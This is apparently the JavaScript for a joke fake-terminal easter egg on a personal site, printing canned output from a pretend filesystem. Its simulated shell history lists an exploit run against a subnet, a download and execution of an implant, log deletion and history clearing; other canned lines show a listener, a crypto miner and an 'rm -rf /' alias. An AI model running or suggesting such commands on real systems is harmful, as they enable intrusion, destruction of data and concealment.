(function () {
  var overlay   = document.getElementById('terminal-overlay');
  var input     = document.getElementById('terminal-input');
  var output    = document.getElementById('terminal-output');
  var closeBtn  = document.getElementById('terminal-close');
  var openBtn   = document.getElementById('terminal-btn');

  if (!overlay) return;

  var cmdHistory = [];
  var historyIdx = -1;

  // ---- Virtual Filesystem ----

  var VFS = {
    'home': {
      'curt': {
        '.secrets':       null,
        '.bash_history':  null,
        '.bashrc':        null,
        'blog':           null,
        'flag.txt':       null,
        'tools': {
          'burpsuite.jar': null,
          'metasploit':    null,
          'nmap':          null
        }
      }
    },
    'etc': {
      'hostname':    null,
      'hosts':       null,
      'passwd':      null,
      'resolv.conf': null,
      'shadow':      null,
      'sudoers':     null
    }
  };

  var cwd = '/home/curt';

  function normalizePath(path) {
    if (!path || path === '~') return '/home/curt';
    if (path.slice(0, 2) === '~/') path = '/home/curt' + path.slice(1);
    if (path[0] !== '/') path = cwd + '/' + path;
    var parts = path.split('/').filter(Boolean);
    var out = [];
    for (var i = 0; i < parts.length; i++) {
      if (parts[i] === '.') continue;
      else if (parts[i] === '..') out.pop();
      else out.push(parts[i]);
    }
    return '/' + out.join('/');
  }

  function getNode(absPath) {
    if (absPath === '/') return VFS;
    var parts = absPath.split('/').filter(Boolean);
    var node = VFS;
    for (var i = 0; i < parts.length; i++) {
      if (!node || typeof node !== 'object') return undefined;
      if (!Object.prototype.hasOwnProperty.call(node, parts[i])) return undefined;
      node = node[parts[i]];
    }
    return node; // null = file, object = dir, undefined = not found
  }

  function isDir(node) { return node !== null && typeof node === 'object'; }

  function promptLabel() {
    return 'root@alpenlol:' + (cwd === '/home/curt' ? '~' : cwd);
  }

  function updatePrompt() {
    var p = document.querySelector('.terminal-prompt');
    if (p) p.textContent = promptLabel() + '$ \u00a0';
    var t = document.querySelector('.terminal-title');
    if (t) t.textContent = promptLabel();
  }

  // ---- Open / Close ----

  function openTerminal() {
    overlay.classList.remove('terminal-hidden');
    if (input) input.focus();
  }

  function closeTerminal() {
    overlay.classList.add('terminal-hidden');
  }

  if (openBtn)  openBtn.addEventListener('click', openTerminal);
  if (closeBtn) closeBtn.addEventListener('click', closeTerminal);

  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeTerminal();
  });

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') closeTerminal();
  });

  // ---- Output helpers ----

  function printLine(text, cls) {
    var span = document.createElement('span');
    span.className = 'terminal-line ' + (cls || 't-output');
    span.textContent = text;
    output.appendChild(span);
    output.appendChild(document.createTextNode('\n'));
    output.scrollTop = output.scrollHeight;
  }

  function typewriterLines(lines, cls, delay) {
    delay = delay || 25;
    var i = 0;
    function next() {
      if (i < lines.length) {
        printLine(lines[i++], cls || 't-output');
        setTimeout(next, delay);
      }
    }
    next();
  }

  // ---- Commands ----

  var COMMANDS = {

    help: function () {
      typewriterLines([
        'available commands:',
        '',
        '  whoami      id          uname       uptime      date        pwd',
        '  ls          cd          cat         ps          history     nmap',
        '  ifconfig    msfconsole  hax         clear       exit'
      ], 't-info');
    },

    whoami: function () {
      printLine('curt');
    },

    id: function () {
      printLine('uid=1337(curt) gid=1337(curt) groups=1337(curt),0(root),31337(elite)');
    },

    uname: function () {
      printLine('Linux alpenlol 6.1.0-hax #1 SMP PREEMPT x86_64 GNU/Linux');
    },

    uptime: function () {
      printLine(' 13:37:00 up 31337 days, 13:37,  1 user,  load average: 0.13, 0.37, 1.337');
    },

    date: function () {
      printLine(new Date().toString());
    },

    pwd: function () {
      printLine(cwd);
    },

    cd: function (args) {
      var dest = normalizePath(args[0] || '~');
      var node = getNode(dest);
      if (node === undefined) {
        printLine('cd: ' + (args[0] || '~') + ': No such file or directory', 't-error');
      } else if (!isDir(node)) {
        printLine('cd: ' + args[0] + ': Not a directory', 't-error');
      } else {
        cwd = dest;
        updatePrompt();
      }
    },

    ls: function (args) {
      // Parse flags and path
      var flags = '';
      var pathArg = null;
      for (var i = 0; i < args.length; i++) {
        if (args[i][0] === '-') flags += args[i].slice(1);
        else pathArg = args[i];
      }

      var target = pathArg ? normalizePath(pathArg) : cwd;
      var node = getNode(target);

      if (node === undefined) {
        printLine('ls: cannot access \'' + (pathArg || cwd) + '\': No such file or directory', 't-error');
        return;
      }
      if (!isDir(node)) {
        printLine(target.split('/').pop());
        return;
      }

      var keys = Object.keys(node).sort();
      var showHidden = flags.indexOf('a') !== -1;
      if (!showHidden) keys = keys.filter(function (k) { return k[0] !== '.'; });

      if (flags.indexOf('l') !== -1) {
        var lines = ['total ' + (keys.length * 8)];
        keys.forEach(function (k) {
          var child = node[k];
          var dir = isDir(child);
          var perm;
          if (dir) {
            perm = 'drwxr-xr-x';
          } else if (k === '.secrets' || k === '.bash_history') {
            perm = '-rw-------';
          } else {
            perm = '-rw-r--r--';
          }
          var size = dir ? '4096' : (k === 'flag.txt' ? '   0' : ' 420');
          lines.push(perm + '  2 curt curt ' + size + ' Mar  9  2026 ' + k + (dir ? '/' : ''));
        });
        typewriterLines(lines, 't-output', 15);
      } else {
        var items = keys.map(function (k) { return isDir(node[k]) ? k + '/' : k; });
        printLine(items.join('  '));
      }
    },

    cat: function (args) {
      var file = args[0] || '';
      if (!file) {
        printLine('cat: missing operand', 't-error');
        return;
      }

      var resolved = normalizePath(file);

      // Special file content
      if (resolved === '/etc/passwd') {
        typewriterLines([
          'root:x:0:0:root:/root:/bin/bash',
          'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
          'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
          'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin',
          'curt:x:1337:1337:Curt,,,:/home/curt:/bin/bash'
        ], 't-output', 15);
        return;
      }

      if (resolved === '/etc/shadow') {
        typewriterLines([
          'root:$6$rounds=656000$d3c0d3me$Y29uZ3JhdHMgb24gZmluZGluZyB0aGUgaGFzaC4gdW5mb3J0dW5hdGVseSBpdCBjb250YWlucyBub3RoaW5nLg:19000:0:99999:7:::',
          'daemon:*:19000:0:99999:7:::',
          'nobody:*:19000:0:99999:7:::',
          'curt:$6$rounds=656000$d3c0d3me$Y29uZ3JhdHMuIHlvdSBmb3VuZCBjdXJ0cyBoYXNoLiB0b28gYmFkIGl0cyBzaGE1MTIgY3J5cHQuIGJ5ZWJ5ZQ:19357:0:99999:7:::'
        ], 't-output', 15);
        return;
      }

      if (resolved === '/etc/hosts') {
        typewriterLines([
          '127.0.0.1   localhost',
          '10.13.37.1  alpenlol',
          '0.0.0.0     telemetry.microsoft.com',
          '0.0.0.0     telemetry.apple.com'
        ], 't-output', 15);
        return;
      }

      if (resolved === '/etc/hostname') {
        printLine('alpenlol');
        return;
      }

      if (resolved === '/etc/resolv.conf') {
        printLine('nameserver 1.1.1.1');
        printLine('nameserver 8.8.8.8');
        return;
      }

      if (resolved === '/etc/sudoers') {
        printLine('cat: /etc/sudoers: Permission denied', 't-error');
        return;
      }

      // VFS lookup
      var node = getNode(resolved);
      if (node === undefined) {
        printLine('cat: ' + file + ': No such file or directory', 't-error');
        return;
      }
      if (isDir(node)) {
        printLine('cat: ' + file + ': Is a directory', 't-error');
        return;
      }

      var fname = resolved.split('/').pop();
      if (fname === '.secrets' || fname === '.bash_history') {
        printLine('cat: ' + file + ': Permission denied', 't-error');
        return;
      }
      if (fname === 'flag.txt') {
        printLine('nice try lol', 't-error');
        return;
      }
      if (fname === '.bashrc') {
        typewriterLines([
          '# ~/.bashrc',
          'export PATH="$HOME/tools:$PATH"',
          'export HISTFILE=/dev/null',
          'alias ll="ls -la"',
          'alias please="sudo"',
          'alias cls="clear"',
          'alias yolo="sudo rm -rf /"',
          'PS1="\\[\\e[31m\\]\\u@\\h:\\w\\$\\[\\e[0m\\] "'
        ], 't-output', 15);
        return;
      }
      if (fname === 'blog') {
        printLine('cat: blog: seriously? it\'s a blog, open a browser', 't-error');
        return;
      }
      if (fname === 'nmap') {
        typewriterLines([
          '\x7fELF\x02\x01\x01\x00 — 64-bit LSB executable, x86-64',
          'cat: nmap: this is a binary. just run nmap.'
        ], 't-output', 15);
        return;
      }
      if (fname === 'metasploit') {
        COMMANDS['msfconsole']([]);
        return;
      }
      if (fname === 'burpsuite.jar') {
        typewriterLines([
          'PK\x03\x04 — JAR archive (Java)',
          'cat: burpsuite.jar: try java -jar instead'
        ], 't-output', 15);
        return;
      }

      printLine('cat: ' + file + ': No such file or directory', 't-error');
    },

    sudo: function (args) {
      var sub = args.join(' ');
      if (sub === 'make me a sandwich') {
        printLine('okay');
      } else if (sub === 'rm -rf /' || sub === 'rm -rf / --no-preserve-root') {
        typewriterLines([
          '[sudo] password for curt: ',
          'Permission denied. This incident will be reported.',
          '(just kidding. but no.)'
        ], 't-error', 300);
      } else if (sub === 'su' || sub === 'su -') {
        typewriterLines([
          '[sudo] password for curt: ',
          'Permission denied.'
        ], 't-error', 300);
      } else {
        typewriterLines([
          '[sudo] password for curt: ',
          'Sorry, user curt is not allowed to execute that.'
        ], 't-error', 300);
      }
    },

    rm: function (args) {
      var flags = args.join(' ');
      if (flags.indexOf('/') !== -1) {
        printLine('rm: Permission denied. Also, rude.', 't-error');
      } else {
        printLine('rm: cannot remove: No such file or directory', 't-error');
      }
    },

    nmap: function () {
      typewriterLines([
        'Starting Nmap 7.94 ( https://nmap.org )',
        'Nmap scan report for localhost (127.0.0.1)',
        'Host is up (0.000042s latency).',
        'Not shown: 993 closed ports',
        'PORT      STATE SERVICE',
        '22/tcp    open  ssh',
        '67/tcp    open  stfu',
        '80/tcp    open  http',
        '420/tcp   open  hell yeah',
        '443/tcp   open  https',
        '1069/tcp  open  nice',
        '31337/tcp open  elite',
        '',
        'Nmap done: 1 IP address (1 host up) scanned in 1.337 seconds'
      ], 't-output', 30);
    },

    msfconsole: function () {
      typewriterLines([
        '',
        '                                                  .',
        '                                                  .',
        '         .                                        .',
        '  .                                              .',
        '         IIIIII    dTb.dTb                        .',
        '           II     4    Y  dTb                    .',
        '           II     6    Y 4  Y                    .',
        '           II     Y    .  6  Y                   .',
        '           II      Y   .  Y  Y                   .',
        '         IIIIII     . db. dY                     .',
        '                                                  .',
        '        =[ metasploit v6.3.4-dev                 ]',
        '+ -- --=[ 2348 exploits - 1220 auxiliary         ]',
        '+ -- --=[ 951 payloads - 45 encoders             ]',
        '+ -- --=[ CVE-2023-2868: loaded                  ]',
        '',
        'msf6 > '
      ], 't-output', 20);
    },

    ps: function () {
      typewriterLines([
        'USER         PID %CPU %MEM COMMAND',
        'root           1  0.0  0.0 /sbin/init',
        'curt          69  0.0  0.0 nice',
        'curt         420  1.3  3.7 hell yeah',
        'curt        1337  0.0  0.1 ncat -lvp 4444',
        'curt        1994  0.2  1.2 netscape -navigator',
        'curt        2868 99.9 41.2 xmrig --coin monero -o pool.minexmr.com:4444',
        'curt        9001  0.0  0.0 [its-over-9000]',
        'root       31337  0.0  0.0 [elite]'
      ], 't-output', 20);
    },

    history: function () {
      typewriterLines([
        '    1  nmap -sV -p- --script vuln target.internal',
        '    2  msfconsole',
        '    3  use exploit/network/barracuda/cve_2023_2868_rce',
        '    4  set RHOSTS 192.168.1.0/24',
        '    5  exploit',
        '    6  sessions -i 1',
        '    7  cat /etc/shadow',
        '    8  wget http://10.13.37.1/implant.elf',
        '    9  chmod +x implant.elf && ./implant.elf',
        '   10  rm -rf /var/log/*',
        '   11  history -c'
      ], 't-output', 20);
    },

    ifconfig: function () {
      typewriterLines([
        'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
        '        inet 10.13.37.1  netmask 255.255.255.0  broadcast 10.13.37.255',
        '        inet6 fe80::dead:beef:1337  prefixlen 64  scopeid 0x20<link>',
        '        ether 00:13:37:ca:fe:01  txqueuelen 1000  (Ethernet)',
        '',
        'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
        '        inet 127.0.0.1  netmask 255.0.0.0'
      ], 't-output', 20);
    },

    ip: function () {
      COMMANDS['ifconfig']([]);
    },

    hax: function () {
      typewriterLines([
        'triggering vuln...',
        'leaking kernel objects... 0xffff888012ab3400',
        'leaking libc base... 0x7f3c4d200000',
        'calculating offsets... done',
        'spraying the shit out of it...',
        'grooming heap...',
        'oops that doesn\'t go there',
        'heap groomed. objects in place.',
        'triggering use-after-free...',
        'got rip control @ 0xffff888012ab3418',
        'pivoting stack...',
        'rop chain loaded.',
        'escalating privileges... done',
        'uid=0(root)',
        '',
        'just kidding. there\'s nothing here.'
      ], 't-output', 120);
    },

    sl: function () {
      printLine('sl: command not found. did you mean ls? lol', 't-error');
    },

    clear: function () {
      output.innerHTML = '';
    },

    exit: function () {
      closeTerminal();
    },

    quit: function () {
      closeTerminal();
    }
  };

  // ---- Input handling ----

  function processCommand(raw) {
    var trimmed = raw.trim();
    if (!trimmed) return;

    // Echo the command
    printLine(promptLabel() + '$ ' + trimmed, 't-prompt');

    // Add to history
    cmdHistory.unshift(trimmed);
    if (cmdHistory.length > 50) cmdHistory.pop();
    historyIdx = -1;

    // Split into cmd + args
    var parts = trimmed.split(/\s+/);
    var cmd   = parts[0].toLowerCase();
    var args  = parts.slice(1);

    if (COMMANDS[cmd]) {
      COMMANDS[cmd](args);
    } else {
      printLine('bash: ' + parts[0] + ': command not found', 't-error');
    }
  }

  if (input) {
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') {
        var val = input.value;
        input.value = '';
        processCommand(val);
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIdx < cmdHistory.length - 1) {
          historyIdx++;
          input.value = cmdHistory[historyIdx];
        }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIdx > 0) {
          historyIdx--;
          input.value = cmdHistory[historyIdx];
        } else {
          historyIdx = -1;
          input.value = '';
        }
      } else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault();
        output.innerHTML = '';
      }
    });
  }

})();
